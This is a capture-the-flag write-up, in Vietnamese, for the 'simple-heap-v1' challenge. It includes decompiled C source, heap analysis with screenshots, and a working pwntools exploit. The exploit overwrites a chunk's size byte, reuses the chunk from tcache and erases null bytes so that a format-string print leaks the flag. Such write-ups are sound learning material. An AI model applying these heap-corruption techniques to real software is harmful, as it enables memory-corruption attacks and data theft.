# simple-heap-v1
## Source code
```c
void __fastcall check(const char *a1)
{
  int fd; // [rsp+14h] [rbp-Ch]
  void *buf; // [rsp+18h] [rbp-8h]

  buf = malloc(0x80uLL);
  fd = open("flag.txt", 0);
  if ( fd < 0 )
    errx(1, "failed to open flag.txt");
  read(fd, buf, 0x80uLL);
  close(fd);
  if ( !strcmp(a1, (const char *)buf) )
  {
    puts("Correct!");
    exit(7);
  }
  printf("%s is not the flag.\n", a1);
  free(buf);
}

void *getchunk()
{
  size_t size; // [rsp+8h] [rbp-28h] BYREF
  void *buf; // [rsp+10h] [rbp-20h]
  void *v3; // [rsp+18h] [rbp-18h]
  ssize_t v4; // [rsp+20h] [rbp-10h]
  unsigned __int64 v5; // [rsp+28h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  printf("size: ");
  __isoc99_scanf("%lu", &size);
  getchar();
  printf("data: ");
  v3 = malloc(size);
  buf = v3;
  while ( size )
  {
    v4 = read(0, buf, size);
    size -= v4;
    buf = (char *)buf + v4;
  }
  return v3;
}

int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+Bh] [rbp-25h]
  int v4; // [rsp+Ch] [rbp-24h] BYREF
  __int64 v5; // [rsp+10h] [rbp-20h]
  void *ptr; // [rsp+18h] [rbp-18h]
  __int64 v7; // [rsp+20h] [rbp-10h]
  unsigned __int64 v8; // [rsp+28h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("Welcome to the flag checker");
  v5 = getchunk();
  puts("I'll give you three chances to guess my flag.");
  ptr = (void *)getchunk();
  check(ptr);
  puts("I'll also let you change one character");
  printf("index: ");
  __isoc99_scanf("%d", &v4);
  getchar();
  printf("new character: ");
  v3 = getchar();
  getchar();
  *((_BYTE *)ptr + v4) = v3;
  check(ptr);
  free(ptr);
  puts("Last chance to guess my flag");
  v7 = getchunk();
  check(v7);
  exit(0);
}
```

## Phân tích
- Chương trình cho phép ta 3 lần đoán flag và kiểm tra sau đó free chunk được kiểm tra
- Chunk 1 chương trình có vẻ không cho ta làm gì với nó
- Chunk 2 được tạo và cho phép ta sửa 1 byte, khi này mình nảy ra ý tưởng sẽ thay đổi size của chunk 2 

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/3846cb81-14c8-4d2e-8e47-02731ff4f7f5)
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/8546ba02-74f1-44ca-9041-cb9fd6c03faf)
- Khi dừng chương trình ở đây ta sẽ có chunk như sau
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/6e43f120-538d-4a6d-8826-3dd4aaf515fa)
- Ta sửa size chunk 2 thành 0x31 và khi free chunk 2
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/9671d3f8-a8ff-4859-aa0a-de9164462ad8)
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/ea0d3fb4-7a28-419b-b9a8-9c5c5fb1a2a2)
- Khi ta malloc một chunk có size 0x30 thì chương trình sẽ lấy chunk 0x30 đang trong tcache ra và trả nó về địa chỉ cũ
- Khi này ta sẽ ghi đè các byte null ở giữa chunk 2 với flag, có 0x10 byte null ở giữa chunk 2 và flag, mục đích khi in ra bằng `%s` nó sẽ không gặp các byte null và đọc được flag
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/5cef7936-5dd1-44e5-8c85-859322540bd9)
- Sau khi ghi đè các null byte ở giữa chunk 2 và flag
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/00605c38-1efc-4ebb-8fd9-0b57b6865a2d)
## Kết quả
![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/549c91c9-599e-43c3-8c39-b63c0f18c14b)
```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b*main+300
                b*main+237
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('localhost', 5000)
else:
        p = process(exe.path)

GDB()
def create(size, data):
        sla(b"size", size)
        sa(b"data", data )
def change(index, data):
        sla(b"index", index)
        sla(b"character", data)

create(b"8", b"a" * 8)
create(b"16", b"a" * 16)
change(b"-8", p8(0x31))
create(b"40", b"a" * 40)


p.interactive()
```